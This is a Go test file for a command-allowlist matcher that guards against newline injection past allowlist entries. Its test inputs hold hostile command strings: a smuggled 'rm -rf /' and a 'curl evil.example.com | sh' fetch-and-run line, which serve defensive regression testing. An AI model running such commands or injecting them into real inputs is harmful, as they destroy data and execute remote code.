// Tests for the command-allowlist matching logic. These are the trust
// boundary between "remote API said run this" and "we actually exec it" —
// a regression here is a remote-code-execution risk, so the table below
// errs on the side of being thorough.
package main

import "testing"

func TestPatternToRegex_BasicGlobs(t *testing.T) {
	cases := []struct {
		pattern string
		input   string
		want    bool
	}{
		// Wildcard at end matches arbitrary suffix.
		{"git *", "git status", true},
		{"git *", "git push origin main", true},
		{"git *", "git", false},                  // no trailing space → no match
		{"git *", "git ", true},                  // empty wildcard match
		{"git *", "git status\nrm -rf /", false}, // newline blocked (M1 fix)

		// Prefix anchoring — "git" alone shouldn't match longer commands.
		{"git", "git", true},
		{"git", "git status", false},
		{"git", "git\n", false},

		// Multi-segment wildcard.
		{"npm run *", "npm run build", true},
		{"npm run *", "npm run test:unit", true},
		{"npm run *", "npm test", false},

		// Case-insensitive matching (Windows-style commands).
		{"powershell *", "PowerShell -Command Get-Process", true},
		{"GIT *", "git status", true},

		// Wildcard in the middle.
		{"docker * up", "docker compose up", true},
		{"docker * up", "docker compose up -d", false}, // anchored at end

		// Escaped regex metacharacters in the literal portion.
		{"foo.bar *", "foo.bar baz", true},
		{"foo.bar *", "fooXbar baz", false}, // literal `.` not a regex `.`
	}

	for _, tc := range cases {
		t.Run(tc.pattern+"_"+tc.input, func(t *testing.T) {
			re := patternToRegex(tc.pattern)
			got := re.MatchString(tc.input)
			if got != tc.want {
				t.Errorf("pattern=%q input=%q got=%v want=%v (regex=%s)",
					tc.pattern, tc.input, got, tc.want, re.String())
			}
		})
	}
}

func TestPatternToRegex_NewlineInjectionBlocked(t *testing.T) {
	// This is the M1 finding: the previous regex used `[\s\S]*` which would
	// match across newlines. A remote message could ship "git status\n; rm -rf ~"
	// and slip past a `git *` allowlist entry. The fix uses `[^\n]*`.
	re := patternToRegex("git *")
	cases := []string{
		"git status\nrm -rf /",
		"git ls-files\n; curl evil.example.com | sh",
		"git\nstatus", // newline directly after the prefix
	}
	for _, input := range cases {
		if re.MatchString(input) {
			t.Errorf("BUG: newline injection through allowlist: input=%q matched %s",
				input, re.String())
		}
	}
}

func TestPatternToRegex_MalformedPatternFallsBackSafely(t *testing.T) {
	// QuoteMeta produces always-valid regex output, so the primary compile
	// path can't actually fail. But the fallbacks should still produce a
	// safe (never-match-anything-dangerous) regex if a future change broke
	// that invariant. Verify the empty-pattern case at minimum behaves.
	re := patternToRegex("")
	if re == nil {
		t.Fatal("patternToRegex returned nil for empty input")
	}
	// Empty pattern → "^$" → matches only the empty string. Not dangerous.
	if re.MatchString("anything") {
		t.Errorf("empty pattern matched non-empty string")
	}
}
